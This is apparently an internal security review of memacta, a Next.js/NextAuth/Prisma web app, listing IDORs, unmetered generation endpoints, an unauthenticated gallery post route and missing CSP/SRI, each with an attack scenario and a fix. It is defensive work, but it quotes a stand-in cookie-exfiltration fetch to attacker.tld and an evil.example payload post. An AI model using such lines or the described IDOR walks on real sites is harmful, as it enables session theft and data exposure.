# Security Review — 2026-05-05 (UTC)

Scope: read-only adversarial review of memacta (Next.js 15 / NextAuth v5 / Prisma / Supabase / fal.ai / Stripe). No code changed.

## Summary
- Files reviewed: ~55 (auth.ts, middleware.ts, every `app/api/**/route.ts`, key page files under `app/{studio,library,personas,dashboard,account,admin,u}`, `lib/{rate-limit,storage,persona,db,admin,ffmpeg-loader,moderation}`, RLS migration, schema, env files).
- Critical: 5 · High: 4 · Medium: 6 · Low: 5

---

## 🔴 Critical (fix before more users sign up)

### C1. `/studio/projects` lists every user's projects to anyone (`app/studio/projects/page.tsx:7`)
- Attack scenario: any unauthenticated visitor opens `https://www.memacta.com/studio/projects` and gets a server-rendered list of every saved Cinema Studio project across the whole DB (id + name + createdAt). They then walk every id through `/studio/<id>` (see C2) to read clip prompts and result URLs.
- Evidence: `prisma.project.findMany({ orderBy: { createdAt: "desc" }, select: { id: true, name: true, createdAt: true } })` — no `where`, no `auth()` call.
- Fix: gate the page with `auth()` and add `where: { userId }`. Mirror the pattern already used in `app/personas/page.tsx:13`.
- Effort: ~10 min.

### C2. `/studio/[id]` IDOR — anyone can read any project by guessing/guessing-from-C1 (`app/studio/[id]/page.tsx:15`)
- Attack scenario: combined with C1, the attacker has a list of every project id. `findUnique({ where: { id } })` returns the project regardless of owner, including `clipsJson` (prompts, result media URLs, model choices).
- Evidence: no `auth()` call, no `userId` in the `where` clause.
- Fix: add `const session = await auth();` then `findFirst({ where: { id, userId: session.user.id } })`.
- Effort: ~10 min.

### C3. `/library/[id]` IDOR — anyone can read any user's generation (`app/library/[id]/page.tsx:14`)
- Attack scenario: a competitor or stalker walks cuid space (or harvests ids from social shares / URL leaks) and pulls every other user's prompt + resultUrl + imageUrl. Because the page also exposes a "Share to Community" form pre-filled with the attacker's own session cookie, the attacker can re-publish someone else's private generation as their own community post.
- Evidence: `prisma.generation.findUnique({ where: { id } })` with no auth or ownership check; the implicit `<form action="/api/community/posts">` then fires with the attacker's session.
- Fix: gate with `auth()` and `findFirst({ where: { id, userId } })`. The community-post route (`app/api/community/posts/route.ts:121`) already verifies ownership by URL match, so even if the IDOR were closed the share button still rejects — but the read leak must be closed.
- Effort: ~15 min.

### C4. `/api/popcorn/pack` runs 3 fal generations with zero credit deduction (`app/api/popcorn/pack/route.ts:37`)
- Attack scenario: an authenticated user (free signup, $0 cost) POSTs `/api/popcorn/pack` repeatedly. Each request fans out three video generations through `getProvider().generate(...)` with no `prisma.user.update({ credits: { decrement } })`, no daily-cap check, no rate limit. fal bills memacta per call. Even one hostile signup with a script can rack up the bill in minutes — the exact failure mode `/api/generate` was hardened against.
- Evidence: route only does `auth()` + `buildPopcornBatch()` + `Promise.allSettled(batch.map(provider.generate))`. No credit code at all.
- Fix: copy the credit/daily-cap pattern from `app/api/generate/route.ts:148-200`. Charge `getCreditCost(model, mediaType) * 3` up front, refund failures, and add the same Upstash burst limit (`rateLimit(rateLimitKey(req,userId), {windowMs:60_000, max:10})`).
- Effort: ~1 hr.

### C5. `/api/popcorn/share` lets anonymous users post arbitrary URLs to the public gallery (`app/api/popcorn/share/route.ts:11`)
- Attack scenario: unauthenticated attacker POSTs `{clips:["https://evil.example/payload.mp4"], presetId:"x"}` to /api/popcorn/share. Route reads `userId ?? null`, then `prisma.post.create({ data: { userId: null, mediaUrl: primaryUrl, ... } })` — it lands directly on the community gallery as an anonymous post. No rate limit, no ownership check, no moderation. This is exactly the spam/malware vector that `/api/community/posts` was tightened against (see lines 51-63 there).
- Evidence: `userId = (...)?.id ?? null;` then the create still succeeds, no `if (!userId) return 401`, no `prisma.generation.findFirst` ownership check.
- Fix: require auth, run `moderatePrompt(presetId+desc)` against the body, verify each clip URL is one of the user's own generations (same query used in `app/api/community/posts/route.ts:121`), and reuse the 60s cooldown.
- Effort: ~30 min.

---

## 🟠 High

### H1. ffmpeg.wasm core fetched from unpkg.com without SRI (`lib/ffmpeg-loader.ts:27`)
- Attack scenario: ffmpeg-core.js + ffmpeg-core.wasm are fetched at runtime from `https://unpkg.com/@ffmpeg/core@0.12.10/dist/umd` and converted to a blob URL the page then executes. unpkg has been hijacked before; if it serves modified bytes (or a maintainer-account compromise like the recent npm event-stream/ua-parser cases happens), every memacta visitor on `/tools/transitions` and any video download flow runs attacker code in your origin — full XSS-equivalent, can steal the NextAuth session cookie and exfil persona photos.
- Evidence: `await ffmpeg.load({ coreURL: await toBlobURL(...), wasmURL: await toBlobURL(...) })` with no `integrity` hash.
- Fix: self-host both files in `/public/ffmpeg/` (they're ~3 MB total, cached by Vercel's CDN), or pin to a content-addressed URL and add SRI hashes. Long term, ship a CSP that pins `script-src 'self'` and `wasm-src 'self'` so the browser refuses an unexpected origin even if the JS bypasses it.
- Effort: ~1-2 hr.

### H2. `/u/[username]` loads every user in the DB on every public profile request (`app/u/[username]/page.tsx:30, 64`)
- Attack scenario: the public profile page calls `prisma.user.findMany({ select: { id, name } })` twice (metadata + render) per request. (1) Once user count grows this is a DoS vector — cheap unauth GET that touches every row. (2) `name` ends up in HTML output for every successfully-matched profile, meaning a scraper can enumerate every signup name by walking guessable usernames, and `userToUsername(user)` is a deterministic transform of name+id (the "username" is a hash, but the DB load returns names anyway). (3) Line 84 also loads `email` for the matched user — currently not rendered, but a future tweak that prints `userFull.email` would silently leak.
- Evidence: two unfiltered `findMany` calls; `select: { ..., email: true }` at line 86.
- Fix: derive a deterministic slug column on User (`username`) and `findUnique({ where: { username } })`. Drop `email` from the `select`. As an interim safety belt, paginate or LIMIT 1000 and short-circuit when the request can't match.
- Effort: ~2-3 hr (schema migration + backfill).

### H3. `/api/persona/[id]/preview` doesn't refund credits when ALL generations fail (`app/api/persona/[id]/preview/route.ts:80-107`)
- Attack scenario: not really an attack — straight bug. Code deducts `TOTAL_COST` (4 × credit) upfront, fans out 4 fal calls. If 0 succeed, only `failed * CREDIT_PER_IMAGE` is refunded — but `failed` is 4, refund is 4 × CREDIT, so net zero. Wait — that's actually correct. Re-reading: `succeeded.length` = 0, `failed = 4`, refund of `4 * 1 = 4` returns the full deduction. OK. Real issue: there is no `creditTransaction` row created for either the deduction or the refund. So your credit ledger silently disagrees with `User.credits` whenever this route is exercised. Auditing a billing dispute later will show un-explained deltas.
- Evidence: lines 81 and 103 use `prisma.user.update` without a paired `creditTransaction.create`. Compare with `app/api/generate/route.ts:210-223,244-262` which does write the ledger.
- Fix: wrap deduction + refund in a transaction and write `CreditTransaction` rows the same way `/api/generate` does. type `"persona_preview"` and `"refund"`.
- Effort: ~30 min.

### H4. `Persona.findUnique` in metadata leaks persona names to anyone who guesses a cuid (`app/personas/[id]/page.tsx:15`)
- Attack scenario: `generateMetadata` does `prisma.persona.findUnique({ where: { id }, select: { name: true } })` with NO ownership filter, then puts `persona.name` into the page `<title>`. Any unauth visitor who guesses (or harvests) a persona id gets the name (often a real person's name — these are biometric likeness identifiers under BIPA/GDPR Art.9). Page body itself is correctly gated, but `<title>` is rendered by the metadata function and visible in the HTML.
- Evidence: `findUnique` not `findFirst`, no `userId` in the where.
- Fix: change to `findFirst({ where: { id, userId, archivedAt: null } })` — requires moving `auth()` into `generateMetadata`. Or just title with a static "Persona | memacta" when no ownership match.
- Effort: ~15 min.

---

## 🟡 Medium

### M1. JWT carries `credits` and `planId` and is refreshed on every request (`auth.ts:83-94`)
- Concern: every `auth()` call hits the DB to refresh `token.credits` + `token.planId`. (a) Doubles DB load on every authenticated route. (b) Stale credit balance still ends up in the JWT cookie size; not a leak, just unusual. (c) If a user is banned or downgraded, the token won't reflect it for one full request. Prefer reading credits/plan from `prisma.user.findUnique` in the route that actually needs them — they already do, redundantly.
- Fix: drop the credits/planId mutation from the `jwt` callback. Routes already query `User.credits` directly.
- Effort: ~30 min + run tests.

### M2. `allowDangerousEmailAccountLinking: true` on Google (`auth.ts:26`)
- Attack scenario: limited but real. If an attacker registers `victim@gmail.com` via the credentials flow first (with a typo'd or unverified email) then sends a magic link or victim signs in via Google, NextAuth links the Google account to the existing credential row — collapsing two identities into one logged-in account. Mitigation here: you require email verification before persona creation (`canCreatePersona`), so the high-risk surface is gated. But account linkage itself happens before `emailVerified`. You also reuse the same User row for credit balance, library, etc.
- Fix: at minimum, only link when the existing User row has `emailVerified !== null`. The standard Auth.js recipe is to write a `signIn` callback that rejects link if `account.provider !== "credentials" && existingUser && !existingUser.emailVerified`. Or set `allowDangerousEmailAccountLinking: false` and force users through a manual link flow.
- Effort: ~1 hr including tests.

### M3. `/api/social/auth/[platform]` mints fake OAuth tokens with no state/PKCE (`app/api/social/auth/[platform]/route.ts:24`)
- Attack scenario: route is currently a stub — it creates a `SocialAccount` row with `accessToken: "mock_token_..."` so the front-end wiring works during dev. Two issues: (1) before this becomes a real OAuth flow you need a CSRF `state` param (HMAC of userId + nonce, validated on callback) — losing/forgetting will mean any third-party site can csrf-link a victim's social account. (2) right now anyone authenticated can replace someone's existing real connection with a mock by hitting `/api/social/auth/instagram` — if a real version ships alongside this stub, it's a privilege bug.
- Fix: when wiring real OAuth, add `state = HMAC(userId + nonce)` round-tripped through the cookie; reject mismatch. Until then, gate the stub on `process.env.NODE_ENV !== "production"`.
- Effort: 30 min for the dev gate; full OAuth implementation is larger.

### M4. `/api/contact` rate limit is in-memory-only (`app/api/contact/route.ts:17`)
- Attack scenario: `RECENT_BY_IP` is a per-instance Map. Vercel scales to many serverless instances; a determined attacker hits the endpoint enough times that each instance holds a fresh Map and the 60s cooldown is effectively per-instance, not global. This is the email-bomb / contact-table-flood vector. Forgot-password is correctly behind Upstash; contact still isn't.
- Fix: switch to `rateLimit(rateLimitKey(req, null), { windowMs: 60_000, max: 1 })`. Same Upstash already in use.
- Effort: ~10 min.

### M5. CSP not set on any response (`middleware.ts` comment at line 48)
- Attack scenario: any reflected XSS — unlikely given all rendering is React + no `dangerouslySetInnerHTML` in app/components/, but you accept user-supplied Persona names and Post titles that flow into pages. The bigger win for memacta specifically is locking `connect-src` to fal.ai + supabase + stripe so a future XSS can't exfil session via `fetch('https://attacker.tld', { method: 'POST', body: document.cookie })`. Also `frame-ancestors 'none'` would let you drop X-Frame-Options.
- Fix: ship a starter CSP in `middleware.ts`. A reasonable first cut for this stack: `default-src 'self'; img-src 'self' https: data:; media-src 'self' https: blob:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.fal.ai https://*.fal.run https://api.resend.com https://*.upstash.io https://*.supabase.co https://o*.ingest.sentry.io https://api.stripe.com; frame-src https://js.stripe.com https://hooks.stripe.com; worker-src 'self' blob:; wasm-src 'self' https://unpkg.com; frame-ancestors 'none'`. (Drop unpkg from wasm-src once H1 is fixed.) Ship Report-Only first to spot breakage.
- Effort: ~3-4 hr including Report-Only iteration.

### M6. `/api/upload` silently falls back to fal.ai for persona-photos in dev (`app/api/upload/route.ts:96-100`)
- Attack scenario: in production with Supabase configured, the persona-photo path correctly uploads to the private `persona-photos` bucket. But the fallback is a soft `console.log` and continues to the standard fal-ai upload — i.e., if Supabase env vars get rotated incorrectly OR the storage client init throws (caught one branch up at line 110-113), persona photos can leak into fal's globally-readable URL space without anyone noticing. The biometric-photo upload should hard-fail in prod, not fall through.
- Evidence: line 97-100: when `result == null` and we're in prod, we `console.log` and fall through to the standard fal upload at line 117.
- Fix: when `context === "persona-photo"` and `getStorageClient()` returns null in prod, return 503 instead of falling through. The dev path can still warn.
- Effort: ~10 min.

---

## 🟢 Low / hardening

### L1. ConsentBlock external links missing `rel="noopener noreferrer"` (`components/persona/ConsentBlock.tsx:40, 44, 52`)
- Cosmetic — all three links go to internal /terms /trust paths but with `target="_blank"` and no rel. Standard polish; no real exploit since hrefs are fixed strings. Add `rel="noopener noreferrer"` for symmetry with the rest of the codebase.

### L2. `/api/healthz` is publicly accessible and reveals integration status
- A scraper learns which integrations memacta uses (db/redis/resend/storage). This is fine for ops-tooling reasons, but consider gating to a known IP range or a header secret if you want to be cautious. Not a finding — flagging as a deliberate trade-off you've made.

### L3. `crypto.timingSafeEqual` in webhook-token can throw on length mismatch (`lib/persona/webhook-token.ts:65`)
- Node throws if the two buffers differ in length. A malformed token with a truncated signature triggers a 500 instead of a 401. The route catches it generically (`return 401`) so behaviorally fine, but worth wrapping in a length check for clarity.

### L4. `app/api/social/post/route.ts:13` doesn't validate body with Zod
- Body is `as { platforms, mediaUrl, ... }` cast directly. Unlikely to be exploitable since downstream `publishToSocial` will fail on bad shape, but inconsistent with the rest of the codebase that uses Zod. Add a schema.

### L5. `prisma.user.update({ credits: { increment } })` in dev stub of `/api/billing/checkout` (line 157)
- Admin-only path in prod (`isAdminEmail` check at 144). Fine. Just noting that the stub bypasses Stripe entirely — if `ADMIN_EMAILS` is ever empty in dev, it falls through to allow ANY auth user (line 143 `!isProd || isAdminEmail`). The non-prod branch is intentional, but be aware the comment claims "smoke tests only".

---

## ✅ Things I checked and found safe

- Stripe webhook signature verification (`app/api/billing/webhook/route.ts:53` uses `stripe.webhooks.constructEvent` with raw body). Idempotent on `Purchase.stripeSessionId` and renewal `description: "renewal:"+invoice.id`. Good.
- Persona webhook is HMAC-signed JWT with TTL (`lib/persona/webhook-token.ts`); idempotent on persona status + trainingJobId. Good.
- Password reset: 32-byte crypto random token, 2h TTL, single-use via `usedAt`, invalidates prior tokens before issue, returns 200 on unknown-email to prevent enumeration. (`app/api/auth/forgot-password/route.ts`). Good.
- Email verification: 32-byte crypto random token, 24h TTL, single-use, redirects on bad token. Good.
- `/api/auth/register`: bcrypt cost 12, Zod-validated, 409 on duplicate (note: enumeration via 409 vs 200 is a minor info leak, but standard practice).
- `/api/account/delete`: GDPR-compliant, uses `prisma.$transaction`, anonymises public posts, scrubs ContactMessage PII, clears NextAuth cookies on the way out.
- Test-only endpoints (`/api/test/*`) all return 404 in prod, verified live with `curl -I https://www.memacta.com/api/test/seed-credits` → 404. Good.
- Prisma usage: no `$queryRawUnsafe`, no string-concatenated `$queryRaw`. Only the literal `SELECT 1` in healthz.
- No `dangerouslySetInnerHTML` anywhere in `app/` or `components/`.
- No `process.env.*` references in client components — secrets won't leak into the bundle.
- `.env`, `.env.*.local` correctly listed in `.gitignore`.
- Stripe idempotency on topup `Purchase.findFirst({ stripeSessionId })` (`app/api/billing/webhook/route.ts:168-172`).
- Persona ownership checks: `getPersonaById` always passes `userId`. Photos route, finalize-instant, upgrade-premium, takedown, consent — all do `findFirst({ id, userId })`. Good IDOR posture except for the metadata leak in H4.
- Projects route (`app/api/projects/[id]/route.ts`) — explicit ownership `findFirst({ id, userId })` on GET/PATCH/DELETE. Good.
- Page-level auth gating on `/dashboard`, `/library`, `/account`, `/personas`, `/personas/new`, `/personas/[id]`, `/admin/messages` — confirmed.
- RLS migration is sound: enables RLS on all 19 app tables, revokes anon + authenticated grants, sets default privileges. Service-role client is server-only (`lib/storage/client.ts`).
- HSTS + X-Frame-Options + Referrer-Policy + Permissions-Policy + X-Content-Type-Options all confirmed live via `curl -I https://www.memacta.com/`.
- Rate limit keys correctly prefer userId over IP (`lib/rate-limit.ts:160`).
- bcrypt cost 12 used consistently for hash + compare. Good.

---

## Out-of-scope but worth noting

- **Penetration test** — code review can't catch every chained vuln. Once C1-C5 + H1-H4 are closed, an external pentester with a real Postgres dump as a target would be valuable before significant marketing spend.
- **fal.ai data retention** — your privacy policy mentions fal as a sub-processor; verify fal's retention TTL on uploaded reference images matches your stated retention. Especially for persona photos, you presumably never want fal to keep them after training completes.
- **Supabase Storage bucket policies** — RLS is on the database side. Persona-photos bucket needs to be private (default for new buckets, but verify in dashboard) and `generations` bucket public-read but not public-write. Out of scope for code review; check the dashboard.
- **Account-takeover-via-stale-OAuth** — combined with M2: if a user changes their Google account email upstream, NextAuth will create a new session under the new email. Worth a manual test.
- **Persona biometric retention on takedown** — `app/api/persona/[id]/takedown/route.ts:31` sets `archivedAt` but the photos and the (currently unused) `faceEmbedding Bytes?` column survive. For BIPA/GDPR Art.17 right-to-erasure, document a hard-delete path triggered N days after takedown, including Supabase Storage object removal (the existing TODO at `lib/persona/service.ts:75` flags this).
- **Daily-cap bypass via clock skew** — `lib/daily-cap.ts` uses Postgres `now()`-relative windows; not exploitable unless clients control the DB clock, which they don't. Just flagging for completeness.
